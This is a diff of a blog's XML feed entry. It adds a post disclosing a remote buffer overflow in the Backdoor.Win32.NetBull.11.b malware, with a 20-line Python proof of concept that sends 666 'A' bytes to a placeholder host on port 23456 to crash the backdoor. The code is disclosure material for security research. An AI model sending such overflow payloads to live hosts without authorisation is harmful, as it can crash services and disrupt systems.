@@ -54,17 +54,23 @@
   
   
   <entry>
-    <title></title>
+    <title>Backdoor.Win32.NetBull.11.b Remote Buffer Overflow</title>
     <link href="/2021/02/05/Backdoor-Win32-NetBull-11-b-Remote-Buffer-Overflow/"/>
     <url>/2021/02/05/Backdoor-Win32-NetBull-11-b-Remote-Buffer-Overflow/</url>
     
-    <content type="html"><![CDATA[<hr><h4 id="Backdoor-Win32-NetBull-11-b-Remote-Buffer-Overflow"><a href="#Backdoor-Win32-NetBull-11-b-Remote-Buffer-Overflow" class="headerlink" title="Backdoor.Win32.NetBull.11.b Remote Buffer Overflow"></a>Backdoor.Win32.NetBull.11.b Remote Buffer Overflow</h4><p>Backdoor.Win32.NetBull.11.b malware suffers from a remote buffer overflow vulnerability.</p><p>Exploit/PoC:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> *<br><br>MALWARE_HOST=<span class="hljs-string">&quot;x.x.x.x&quot;</span><br>PORT=<span class="hljs-number">23456</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">doit</span>():</span><br>    s=socket(AF_INET, SOCK_STREAM)<br>    s.connect((MALWARE_HOST, PORT))<br><br>    PACKOLA = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">666</span><br>    s.send(PACKOLA)<br>    s.close()<br><br>    print(<span class="hljs-string">&quot;Backdoor.Win32.NetBull.11.b / Remote Buffer Overflow&quot;</span>);<br>    print(<span class="hljs-string">&quot;MD5: 0e0fc966862971c29edd4dcaa0ba8e86&quot;</span>);<br>    print(<span class="hljs-string">&quot;By Malvuln&quot;</span>);<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    doit()<br></code></pre></div></td></tr></table></figure>]]></content>
+    <content type="html"><![CDATA[<hr><hr><h4 id="Backdoor-Win32-NetBull-11-b-Remote-Buffer-Overflow"><a href="#Backdoor-Win32-NetBull-11-b-Remote-Buffer-Overflow" class="headerlink" title="Backdoor.Win32.NetBull.11.b Remote Buffer Overflow"></a>Backdoor.Win32.NetBull.11.b Remote Buffer Overflow</h4><p>Backdoor.Win32.NetBull.11.b malware suffers from a remote buffer overflow vulnerability.</p><p>Exploit/PoC:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> *<br><br>MALWARE_HOST=<span class="hljs-string">&quot;x.x.x.x&quot;</span><br>PORT=<span class="hljs-number">23456</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">doit</span>():</span><br>    s=socket(AF_INET, SOCK_STREAM)<br>    s.connect((MALWARE_HOST, PORT))<br><br>    PACKOLA = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">666</span><br>    s.send(PACKOLA)<br>    s.close()<br><br>    print(<span class="hljs-string">&quot;Backdoor.Win32.NetBull.11.b / Remote Buffer Overflow&quot;</span>);<br>    print(<span class="hljs-string">&quot;MD5: 0e0fc966862971c29edd4dcaa0ba8e86&quot;</span>);<br>    print(<span class="hljs-string">&quot;By Malvuln&quot;</span>);<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    doit()<br></code></pre></div></td></tr></table></figure>]]></content>
     
+    
+    <categories>
+      
+      <category>Exploit</category>
+      
+    </categories>
     
     
     <tags>
       
-      <tag>Remote Stack</tag>
+      <tag>Remote Buffer Overflow</tag>
       
     </tags>
     
